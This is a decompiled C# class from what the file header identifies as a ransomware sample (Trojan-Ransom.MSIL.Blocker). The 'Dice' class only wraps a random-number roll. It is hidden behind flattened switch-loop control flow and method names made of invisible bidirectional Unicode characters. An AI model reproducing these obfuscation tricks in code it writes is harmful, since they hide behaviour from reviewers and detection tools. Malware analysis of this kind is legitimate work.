// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Dice
// Assembly: WaitHand, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: A25291C7-A109-4713-B14B-FDD04827C77F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-c95b09c6ffd61a284edc93ed78ccae28eae9cbf5eb73943fd588e31dfe8b57dc.exe

using System;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Dice
  {
    private readonly Random _random;

    public Dice()
    {
label_1:
      int num1 = -109309359;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -152131072)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 541362511 ^ -733508971;
            continue;
          case 2:
            this._random = Dice.\u202E‫⁫‭‌‍‌⁫⁮‎‪⁬‏⁬⁬⁮‎⁪⁮‪‫‍⁬‬‬‮⁭⁬⁮⁪‪‌‪‎⁫‏⁬‭‍‏‮((int) DateTime.Now.Ticks);
            num1 = (int) num2 * 274371338 ^ 746237588;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public bool Roll(float chance)
    {
label_1:
      int num1 = -1535336367;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1730785822)) % 3U)
        {
          case 1:
            flag = Dice.\u202D‬‏‭‪‎⁬‭‭​‏‏‌⁯​⁯‫⁯‌‍⁫‎⁭⁪‎‪‫⁬⁯⁫‫‏‎⁫‎⁬⁫‮⁮⁫‮(this._random) <= (double) chance;
            num1 = (int) num2 * -2089515799 ^ 234881749;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    static Random \u202E‫⁫‭‌‍‌⁫⁮‎‪⁬‏⁬⁬⁮‎⁪⁮‪‫‍⁬‬‬‮⁭⁬⁮⁪‪‌‪‎⁫‏⁬‭‍‏‮([In] int obj0) => new Random(obj0);

    static double \u202D‬‏‭‪‎⁬‭‭​‏‏‌⁯​⁯‫⁯‌‍⁫‎⁭⁪‎‪‫⁬⁯⁫‫‏‎⁫‎⁬⁫‮⁮⁫‮([In] Random obj0) => obj0.NextDouble();
  }
}
